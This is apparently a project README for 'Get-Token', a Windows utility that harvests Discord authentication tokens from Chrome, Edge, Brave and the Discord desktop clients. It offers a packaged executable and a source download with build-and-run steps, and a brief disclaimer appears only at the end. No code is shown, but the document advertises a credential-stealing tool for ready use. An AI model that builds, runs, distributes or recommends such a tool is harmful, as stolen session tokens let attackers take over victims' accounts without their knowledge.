# Get-Token

A specialized utility to scan and retrieve Discord authentication tokens from local system directories.

> [!IMPORTANT]
> **Windows Systems Only!** Optimized specifically for Windows 10 and Windows 11. Older Windows versions may work but are not officially supported.

---

## 📂 Scanning Scope

### 🌐 Web Browsers
The tool extracts data from the following Chromium-based browsers:
* **Google Chrome**
* **Microsoft Edge**
* **Brave Browser**

### 💻 Desktop Apps
The tool targets all official Discord client distributions:
* **Discord** (Stable)
* **Discord PTB** (Public Test Build)
* **Discord Canary**

---

## ⚙️ Requirements & Compatibility

* **OS:** Windows 10 / Windows 11
* **Language:** [Python 3.13](https://apps.microsoft.com/detail/9PNRBTZXMB4Z?hl=en-us&gl=GB&ocid=pdpshare)
* **UI Engine:** * Primary: **WebView2** (Recommended for best experience)
    * Fallback: **QT** (Automatic fallback if WebView2 is not detected)

---

## 🚀 Downloads

| Version | Description | Link |
| :--- | :--- | :--- |
| **Latest Release** | Stable build. Recommended for most users. Pre-packaged Python in executable format. | [📦 Download Stable](https://github.com/xritura01/Get-token/releases/latest) |
| **Bleeding Edge** | Most recent commits; Potentially Untested. Requires manual build. | [🛠️ Download Dev Build](https://github.com/xritura01/Get-token/archive/refs/heads/main.zip) |

### 🛠️ How to run Bleeding Edge
1. Ensure Python is installed, you can get the correct version from the Python link above
2. **Extract** the downloaded `.zip` file.
3. Run `build.bat` and wait for the process to complete.
4. Run `run.bat` to launch the utility.

---

> [!WARNING]
> **Disclaimer:** Use this tool responsibly and only on systems you own or have explicit permission to audit. Unauthorized access to credentials may violate Terms of Service and local privacy laws. The Utility Team is not responsible for your actions.
